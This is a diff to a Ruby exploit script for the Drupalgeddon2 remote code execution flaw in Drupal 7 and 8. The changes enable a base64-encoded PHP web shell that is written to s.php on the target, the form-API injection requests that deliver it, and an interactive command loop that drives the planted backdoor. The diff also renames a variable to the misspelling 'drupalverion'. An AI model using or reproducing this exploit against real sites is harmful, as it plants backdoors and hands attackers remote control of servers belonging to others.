@@ -46,9 +46,9 @@ end
 
 # Payload (we could just be happy with this, but we can do better!)
 #evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
-# evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
-# evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
-evil = 'echo Works!'
+evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
+evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
+
 
 # Feedback
 puts "[*] Target : #{target}"
@@ -57,7 +57,7 @@ puts "-"*80
 
 
 # Try and get version
-drupalversion = nil
+drupalverion = nil
 # Possible URLs
 url = [
   target + "CHANGELOG.txt",
@@ -79,36 +79,36 @@ url.each do|uri|
     # Patched already?
     puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"
 
-    drupalversion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
-    puts "[+] Drupal!: #{drupalversion}"
+    drupalverion = response.body.match(/Drupal (.*)[, ]/).to_s().slice(/Drupal (.*)[, ]/, 1).strip
+    puts "[+] Drupal!: #{drupalverion}"
     # Done!
     break
   elsif response.code == "403"
     puts "[+] Found  : #{uri} (#{response.code})"
 
-    drupalversion = uri.match(/core/)? '8.x' : '7.x'
-    puts "[+] Drupal?: #{drupalversion}"
+    drupalverion = uri.match(/core/)? '8.x' : '7.x'
+    puts "[+] Drupal?: #{drupalverion}"
   else
     puts "[!] MISSING: #{uri} (#{response.code})"
   end
 end
 
-if not drupalversion
+if not drupalverion
   puts "[!] Didn't detect Drupal version"
   puts "[!] Forcing Drupal v8.x attack"
-  drupalversion = "8.x"
+  drupalverion = "8.x"
 end
 puts "-"*80
 
 
 # PHP function to use (don't forget about disabled functions...)
-phpmethod = drupalversion.start_with?('8')? 'exec' : 'passthru'
+phpmethod = drupalverion.start_with?('8')? 'exec' : 'passthru'
 puts "[*] PHP cmd: #{phpmethod}"
 puts "-"*80
 
 
 ## Check the version to match the payload
-if drupalversion.start_with?('8')
+if drupalverion.start_with?('8')
   # Method #1 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
   #url = target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
   #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
@@ -117,7 +117,7 @@ if drupalversion.start_with?('8')
   url = target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
   # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
   payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil
-elsif drupalversion.start_with?('7')
+elsif drupalverion.start_with?('7')
   # Method #3 - Drupal 7, name, #post_render - response is 200
   url = target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
   payload = "form_id=user_pass&_triggering_element_name=name"
@@ -139,7 +139,7 @@ end
 
 
 # Drupal v7 needs an extra value from a form
-if drupalversion.start_with?('7')
+if drupalverion.start_with?('7')
   req = Net::HTTP::Post.new(uri.request_uri)
   req.body = payload
   response = http.request(req)
@@ -159,53 +159,51 @@ req.body = payload
 # Check response
 response = http.request(req)
 if response.code == "200"
+  puts "[+] Target seems to be exploitable! w00hooOO!"
   #puts "[+] Result: " + JSON.pretty_generate(JSON[response.body])
-  result = drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
-  if result.include? "Works!"
-    puts "[+] Target seems to be exploitable! w00hooOO!"
-    puts "[+] Result: #{result}"
-  else
-    puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
-  end
+  result = drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
+  puts "[+] Result: #{result}"
+else
+  puts "[!] Target does NOT seem to be exploitable ~ Response: #{response.code}"
 end
 puts "-"*80
 
 
 # Feedback
-# puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
-# puts "-"*80
+puts "[*]   curl '#{target}s.php' -d 'c=whoami'"
+puts "-"*80
 
 
-# # Test to see if backdoor is there
-# exploit_uri = URI(target + "s.php")
-# # Check response
-# http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
-# request = Net::HTTP::Get.new(exploit_uri.request_uri)
-# response = http.request(request)
+# Test to see if backdoor is there
+exploit_uri = URI(target + "s.php")
+# Check response
+http = Net::HTTP.new(exploit_uri.host, exploit_uri.port, proxy_addr, proxy_port)
+request = Net::HTTP::Get.new(exploit_uri.request_uri)
+response = http.request(request)
 
-# if response.code == "200"
-#   puts "[*] Fake shell: "
+if response.code == "200"
+  puts "[*] Fake shell: "
 
-#   # Stop any CTRL + C action ;)
-#   trap('INT', 'SIG_IGN')
+  # Stop any CTRL + C action ;)
+  trap('INT', 'SIG_IGN')
 
-#   # Forever loop
-#   loop do
-#     # Get input
-#     command = Readline.readline('drupalgeddon2> ', true)
+  # Forever loop
+  loop do
+    # Get input
+    command = Readline.readline('drupalgeddon2> ', true)
 
-#     # Exit
-#     break if command =~ /exit/
+    # Exit
+    break if command =~ /exit/
 
-#     # Blank link?
-#     next if command.empty?
+    # Blank link?
+    next if command.empty?
 
-#     # Send request
-#     req = Net::HTTP::Post.new(exploit_uri.request_uri)
-#     req.body = "c=#{command}"
-#     puts http.request(req).body
-#   end
-# else
-#   puts "[!] Exploit FAILED ~ Response: #{response.code}"
-#   exit
-# end
+    # Send request
+    req = Net::HTTP::Post.new(exploit_uri.request_uri)
+    req.body = "c=#{command}"
+    puts http.request(req).body
+  end
+else
+  puts "[!] Exploit FAILED ~ Response: #{response.code}"
+  exit
+end
